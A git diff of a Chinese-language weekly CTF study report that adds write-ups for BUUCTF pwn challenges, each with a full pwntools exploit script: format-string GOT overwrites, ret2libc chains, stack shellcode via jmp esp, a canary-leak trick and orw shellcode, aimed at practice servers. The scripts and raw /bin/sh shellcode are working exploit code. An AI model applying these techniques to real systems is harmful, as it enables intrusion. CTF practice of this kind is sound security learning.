@@ -1,5 +1,5 @@
 # week5
-# BUUCTF-picoctf_2018_shellcode
+# 1.BUUCTF-picoctf_2018_shellcode
 vuln函数输入shellcode
 
 <img width="208" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/efecac50-593e-40ac-9877-1966868c3ed3">
@@ -33,7 +33,7 @@ shell()
 ```
 
 
-## jarvisoj_level5
+## 2.jarvisoj_level5
 栈溢出
 
 <img width="273" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/7527ba93-aa8b-402b-b2cc-be09b691c222">
@@ -108,7 +108,7 @@ shell()
 ```
 
 
-## BUUCTF-ciscn_2019_es_7
+## 3.BUUCTF-ciscn_2019_es_7
 程序就调用了两个函数read和write 其中read函数明显存在溢出
 
 <img width="657" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/cbdc640b-e59c-4f23-ba3c-2f6c20820a41">
@@ -243,7 +243,7 @@ sl(payload)
 shell()
 ```
 
-## BUUCTF-cmcc_pwnme2
+## 4.BUUCTF-cmcc_pwnme2
 无限制栈溢出
 
 <img width="267" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/caef0b84-ef45-46ed-8ba5-f140d183eb9d">
@@ -312,7 +312,7 @@ sl(payload)
 shell()
 ```
 
-## BUUCTF-picoctf_2018_got_shell
+## 5.BUUCTF-picoctf_2018_got_shell
 拥有任意地址写能力
 
 <img width="830" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/26035b99-46e9-4d03-b405-3729ebf57a61">
@@ -352,7 +352,7 @@ sl('0x804854B')
 shell()
 ```
 
-## BUUCTF-mrctf2020_shellcode_revenge
+## 6.BUUCTF-mrctf2020_shellcode_revenge
 可见字符shellcode
 
 首先利用pwntools生成默认的shellcode 输入到文件中
@@ -391,7 +391,7 @@ s(sc)
 shell()
 ```
 
-## BUUCTF-wdb_2018_2nd_easyfmt
+## 7.BUUCTF-wdb_2018_2nd_easyfmt
 无限格式化字符串漏洞
 
 <img width="248" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fd33cb71-15a8-4847-a865-9b8dd23ff31b">
@@ -459,7 +459,7 @@ sl("/bin/sh")
 shell()
 ```
 
-## BUUCTF-mrctf2020_easy_equation
+## 8.BUUCTF-mrctf2020_easy_equation
 只要满足等式即可执行system
 
 <img width="872" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/afdf1646-00fa-4354-bb46-8616df0d265f">
@@ -566,7 +566,7 @@ sl(payload)
 shell()
 ```
 
-## BUUCTF-actf_2019_babystack
+## 9.BUUCTF-actf_2019_babystack
 存在0x10byte的溢出 并且能够知道我们的输入的地址（栈地址）
 
 <img width="420" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/80c7e62f-a490-45a1-902d-5ba3e2269c7b">
@@ -701,4 +701,517 @@ s(payload)
 
 shell()
 ```
+
+## 10.BUUCTF-inndy_echo
+无限制格式化字符串利用
+
+<img width="368" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/352f297d-ee4c-48b0-bfbe-e0b4121294c0">
+
+程序中有system函数 直接覆盖printf_got为system即可
+
+### exp_echo.py
+```python
+from pwn import *
+# p = process("./echo")
+p = remote("node4.buuoj.cn",28052)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+offset = 7
+
+printf_got = 0x804a010
+system_plt = 0x8048400
+
+payload = fmtstr_payload(7, {printf_got:system_plt}, write_size='byte')
+
+raw_input("Ther")
+sl(payload)
+
+raw_input("Ther")
+sl('/bin/sh')
+
+shell()
+```
+
+## 11.BUUCTF-suctf_2018_basic pwn
+栈溢出覆盖返回地址为backdoor
+
+### exp_SUCTF_2018_basic_pwn.py
+```python
+from pwn import *
+# p = process("./SUCTF_2018_basic_pwn")
+p = remote("node4.buuoj.cn",25341)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+offset = 280
+backdoor = 0x000000000401157
+
+payload = b'A' * offset + p64(backdoor)
+raw_input("Ther")
+sl(payload)
+
+shell()
+```
+
+## 12.BUUCTF-x_ctf_b0verfl0w
+没开启NX 存在溢出
+
+<img width="292" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/96f7e784-7355-409b-9a7f-aeb8f7358a55">
+
+考虑通过jmp esp gadget直接跳到栈上执行shellcode 但要求shellcode长度不超过36 
+
+并且在jmp esp后 此时的栈顶装的并不是shellcode 需要再通过一个跳板（"sub esp, 0x28; call esp"）来跳到shellcode
+
+### exp_b0verfl0w.py
+```python
+from pwn import *
+# p = process("./b0verfl0w")
+p = remote("node4.buuoj.cn",26695)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+sub_esp_0x24_ret = 0x8048500
+jmp_esp = 0x8048504
+
+offset = 36
+
+# sc = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+sc = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+
+
+payload = sc.ljust(offset, '\x90') + p32(jmp_esp) + asm('sub esp,0x28;call esp')
+
+ru("What's your name?\n")
+raw_input("Ther")
+sl(payload)
+
+shell()
+```
+
+## 13.BUUCTF-picoctf_2018_leak_me
+本题是利用局部变量之间没有间隙来泄漏password
+
+栈上有一个name和password变量 name大小的空间结束之后正好是password 通过将name变量填充满
+
+这样在输出name时就会将passwrod也一起输出（没有被'\x00'截断）
+
+## 14.BUUCTF-wustctf2020_name_your_cat
+数组溢出 没有检查数组的边界
+
+<img width="660" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/31e438f9-e4c0-4e29-aa91-78872ab5cf80">
+
+计算好偏移溢出覆盖返回地址为后门函数即可
+
+<img width="299" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/5105f48a-c2e1-44c3-b75c-be50a4acae57">
+
+### exp_wustctf2020_name_your_cat.py
+```python
+from pwn import *
+# p = process("./wustctf2020_name_your_cat")
+p = remote("node4.buuoj.cn",27681)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+shell_addr = 0x80485CB
+offset = 7
+
+for i in range(5):
+	ru('>')
+	sl(str(offset))
+	ru('Give your name plz: ')
+	sl(p32(shell_addr))
+
+shell()
+```
+
+## 14.BUUCTF-axb_2019_fmt64
+无限制格式化字符串利用
+
+<img width="380" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/292e03bd-6b40-4153-aa05-8e60d9c09970">
+
+泄漏libc 覆盖printf_got为one_gadget 需要注意的就是构造格式化字符串写时要注意之前写入的字符个数
+
+### exp_axb_2019_fmt64.py
+```python
+from pwn import *
+# p = process("./axb_2019_fmt64")
+p = remote("node4.buuoj.cn",25285)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")
+
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+offset = 8
+
+puts_got = 0x000000000601018
+printf_got = 0x000000000601030
+
+# 1.leak libc
+payload = b'%9$saaaa' + p64(puts_got)
+ru('Please tell me:')
+raw_input("Ther")
+sl(payload)
+
+libc_puts = u64(ru('\x7f')[-6:].ljust(8, b'\x00'))
+success("libc_puts ==> {}".format(hex(libc_puts)))
+
+libc_base = libc_puts - libc.symbols['puts']
+success("libc_base ==> {}".format(hex(libc_base)))
+
+libc_system = libc_base + libc.symbols['system']
+success("libc_system ==> {}".format(hex(libc_system)))
+
+# ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
+ones = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+
+one_gadget = libc_base + ones[0]
+success("one_gadget ==> {}".format(hex(one_gadget)))
+
+one1 = one_gadget & 0xffff
+one2 = (one_gadget >> 16) & 0xffff
+
+success("one1 ==> {}".format(hex(one1)))
+success("one2 ==> {}".format(hex(one2)))
+
+# 2.printf_got --> one_gadget
+payload	= b'%' + str(one1-9) + 'c%12$hnaaaa'
+if (one2 - one1) > 0:
+	payload+= b'%' + str(one2-one1-4) + 'c%13$hnaaa'
+else:
+	payload+= b'%' + str(one2-one1+0x10000-4) + 'c%13$hnaaa'
+
+payload+= p64(printf_got) + p64(printf_got+2) 
+
+success("payload ==> {}".format(payload))
+
+ru('Please tell me:')
+raw_input("Ther")
+sl(payload)
+
+shell()
+```
+
+## 15.BUUCTF-cmcc_pwnme1
+getfruit函数存在栈溢出
+
+<img width="311" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/0f35319b-f265-41e3-b0ba-20e137335745">
+
+正常溢出覆盖返回地址为getflag即可 但在BUUCTF中flag路径不对 于是ret2libc
+
+### exp_pwnme1.py
+```python
+from pwn import *
+# p = process("./pwnme1")
+p = remote("node4.buuoj.cn",25762)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-32.so")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+offset = 168
+get_flag = 0x8048677
+
+puts_plt = 0x8048548
+puts_got = 0x804a028
+main = 0x80486F4
+
+ru(">> 6. Exit    \n")
+raw_input("Ther")
+sl('5')
+
+# 1.leak libc
+payload = b'A' * offset + p32(puts_plt) + p32(main) + p32(puts_got)
+ru("Please input the name of fruit:")
+sl(payload)
+
+libc_puts = u32(ru('\xf7')[-4:])
+success("libc_puts ==> {}".format(hex(libc_puts)))
+
+libc_base = libc_puts - libc.symbols['puts']
+success("libc_base ==> {}".format(hex(libc_base)))
+
+libc_system = libc_base + libc.symbols['system']
+success("libc_system ==> {}".format(hex(libc_system)))
+
+libc_binsh = libc_base + libc.search('/bin/sh').next()
+success("libc_binsh ==> {}".format(hex(libc_binsh)))
+
+# 2.system("/bin/sh")
+ru(">> 6. Exit    \n")
+raw_input("Ther")
+sl('5')
+
+payload = b'A' * offset + p32(libc_system) + p32(0xdeadbeef) + p32(libc_binsh)
+ru("Please input the name of fruit:")
+sl(payload)
+
+shell()
+```
+
+## 16.BUUCTF-axb_2019_brop64
+栈溢出
+
+<img width="603" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/28ad1a8c-fffe-4b18-9e98-ca90a03d0732">
+
+常规ret2libc
+
+### exp_axb_2019_brop64.py
+```python
+from pwn import *
+# p = process("./axb_2019_brop64")
+p = remote("node4.buuoj.cn",25597)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+offset = 216
+
+pop_rdi_ret = 0x0000000000400963
+main = 0x0000000004007D6
+
+puts_plt = 0x400640
+puts_got = 0x000000000601018
+
+# 1.leak libc
+payload = b'A' * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
+
+ru("Please tell me:")
+#raw_input("Ther")
+sl(payload)
+
+libc_puts = u64(ru('\x7f')[-6:].ljust(8, '\x00'))
+success("libc_puts ==> {}".format(hex(libc_puts)))
+
+libc_base = libc_puts - libc.symbols['puts']
+success("libc_base ==> {}".format(hex(libc_base)))
+
+libc_system = libc_base + libc.symbols['system']
+success("libc_system ==> {}".format(hex(libc_system)))
+
+libc_binsh = libc_base + libc.search('/bin/sh').next()
+success("libc_binsh ==> {}".format(hex(libc_binsh)))
+
+# 2.system("/bin/sh")
+payload = b'A' * offset + p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system) 
+
+ru("Please tell me:")
+raw_input("Ther")
+sl(payload)
+
+shell()
+```
+
+## 17.BUUCTF-wdb2018_guess
+将flag读入到buf中 开启了canary 并且给了3次栈溢出的机会（通过fork进程）
+
+<img width="518" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fec5e5aa-9943-4780-9a1d-5210159968ae">
+
+首先想到可以覆盖__libc_argv[0] 但不知道buf的地址在哪里 学习到可以通过泄漏libc
+
+从而泄漏libc的__environ的值 这个值保存着一个栈地址（指向环境变量）
+
+所以3次栈溢出可以构造为 
+
+1.覆盖__libc_argv[0]为put_got 泄漏libc地址
+
+2.覆盖__libc_argv[0]为libc__environ 泄漏栈地址
+
+3.找到泄漏的栈地址与buf的偏移 覆盖__libc_argv[0]为buf地址 泄漏flag
+
+### exp_GUESS.py
+```python
+from pwn import *
+# p = process("./GUESS")
+p = remote("node4.buuoj.cn",28526)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+puts_got = 0x000000000602020
+
+# 1.leak libc
+payload = b'A' * 0x128 + p64(puts_got)
+ru("Please type your guessing flag\n")
+sl(payload)
+
+ru("*** stack smashing detected ***: ")
+
+libc_puts = u64(ru('\x7f').ljust(8, '\x00'))
+success("libc_puts ==> {}".format(hex(libc_puts)))
+
+libc_base = libc_puts - libc.symbols['puts']
+success("libc_base ==> {}".format(hex(libc_base)))
+
+libc_environ = libc_base + libc.symbols['__environ']
+success("libc_environ ==> {}".format(hex(libc_environ)))
+
+# 2.leak stack
+payload = b'A' * 0x128 + p64(libc_environ)
+ru("Please type your guessing flag\n")
+sl(payload)
+
+ru("*** stack smashing detected ***: ")
+
+stack_addr = u64(ru('\x7f').ljust(8, '\x00'))
+success("stack_addr ==> {}".format(hex(stack_addr)))
+
+# 3.leak flag
+flag_addr = stack_addr - 0x168
+
+payload = b'A' * 0x128 + p64(flag_addr)
+ru("Please type your guessing flag\n")
+raw_input("Ther")
+sl(payload)
+
+
+shell()
+```
+
+## 18.BUUCTF-[极客大挑战 2019]Not Bad
+orw 需要修改一下pwntools生成的shellcode 长度缩小一些
+
+### exp_bad.py
+```python
+from pwn import *
+# p = process("./bad")
+p = remote("node4.buuoj.cn",27878)
+context.log_level = 'debug'
+context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+jmp_rsp = 0x0000000000400a01
+
+sc = asm(shellcraft.open('flag'))
+sc+= asm(shellcraft.read('rax', 'rsp', 0x30))
+# sc+= asm(shellcraft.write(1, 'rsp', 0x30))
+sc += asm('''
+	push 1
+    pop rdi
+    /* call write() */
+    push 1 /* 1 */
+    pop rax
+    syscall
+	''')
+
+payload = sc.ljust(40, '\x90') + p64(jmp_rsp) + asm("sub rsp, 48; call rsp")
+ru("Easy shellcode, have fun!\n")
+
+sl(payload)
+
+shell()
+```
+
+
+
+
+
+
+
+
+
+
 
